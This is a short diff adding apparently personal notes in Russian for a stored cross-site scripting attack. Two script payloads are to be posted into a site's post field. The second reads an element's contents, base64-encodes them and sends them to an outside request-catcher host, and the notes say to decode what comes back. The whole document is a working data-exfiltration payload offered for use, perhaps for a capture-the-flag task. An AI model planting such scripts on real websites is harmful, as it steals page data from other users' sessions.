@@ -1,0 +1,15 @@
+Там где нужно писать пост
+<script>  
+var x = document.getElementById("page-top");
+if(x){ location.href="https://en48y2hgrj3qb.x.pipedream.net/asd";}
+</script>
+
+а потом это 
+
+<script>  
+  document.addEventListener("DOMContentLoaded", function(){
+    var x = document.getElementById("page-top").innerHTML;
+    location.href="https://en48y2hgrj3qb.x.pipedream.net/test"+btoa(x);
+})
+</script>
+Закинуть полученную в декодере
